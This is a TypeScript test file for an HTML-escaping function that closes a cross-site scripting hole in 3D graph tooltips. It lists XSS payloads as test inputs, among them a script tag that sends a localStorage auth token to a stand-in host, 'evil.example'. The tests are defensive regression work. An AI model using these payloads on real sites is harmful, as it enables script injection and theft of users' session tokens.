/**
 * The 3D graph tooltips (`react-force-graph` → `float-tooltip` → d3 `.html()`,
 * which is `innerHTML`) rendered a node's `name` verbatim. In the state graph
 * that name comes from the uploaded state blob, so workspace write became script
 * execution for every viewer holding plan.
 *
 * These drive the real function rather than asserting on the source text.
 */
import { describe, it } from 'node:test'
import assert from 'node:assert/strict'

import { escapeHtml } from '../src/lib/html-escape.ts'

describe('the payloads a resource name could carry into innerHTML', () => {
  for (const [why, raw, expected] of [
    [
      'an img/onerror payload, which needs no script-src to run',
      '<img src=x onerror=alert(document.domain)>',
      '&lt;img src=x onerror=alert(document.domain)&gt;',
    ],
    [
      'a script element',
      '<script>fetch("//evil.example?t="+localStorage.terrapod_auth)</script>',
      '&lt;script&gt;fetch(&quot;//evil.example?t=&quot;+localStorage.terrapod_auth)&lt;/script&gt;',
    ],
    [
      'an svg/onload payload',
      '<svg onload=alert(1)>',
      '&lt;svg onload=alert(1)&gt;',
    ],
    [
      'breaking out of a double-quoted attribute',
      'x" onmouseover="alert(1)',
      'x&quot; onmouseover=&quot;alert(1)',
    ],
    [
      'breaking out of a single-quoted attribute',
      "x' onmouseover='alert(1)",
      'x&#39; onmouseover=&#39;alert(1)',
    ],
  ] as const) {
    it(`neutralises ${why}`, () => {
      assert.equal(escapeHtml(raw), expected)
    })
  }
})

describe('the ordinary names a graph shows', () => {
  for (const plain of [
    'aws_instance',
    'this',
    'nat-eu-west-1a',
    'module.vpc.aws_subnet.this[0]',
    'private_0',
    '',
  ]) {
    it(`leaves ${JSON.stringify(plain)} alone`, () => {
      assert.equal(escapeHtml(plain), plain)
    })
  }
})

describe('the ampersand ordering, which is the classic way to get this wrong', () => {
  it('escapes & once, not twice', () => {
    // Replacing `<` before `&` would turn this into `&amp;lt;` and the tooltip
    // would read `&lt;b&gt;` to the viewer instead of `<b>`.
    assert.equal(escapeHtml('<b>'), '&lt;b&gt;')
  })

  it('does not double-escape an entity the name already contained', () => {
    assert.equal(escapeHtml('&lt;b&gt;'), '&amp;lt;b&amp;gt;')
  })

  it('escapes a bare ampersand', () => {
    assert.equal(escapeHtml('a & b'), 'a &amp; b')
  })

  it('leaves nothing that can open a tag or close an attribute', () => {
    const out = escapeHtml(`<>&"'`)
    for (const dangerous of ['<', '>', '"', "'"]) {
      assert.ok(!out.includes(dangerous), `${dangerous} survived as ${out}`)
    }
  })
})
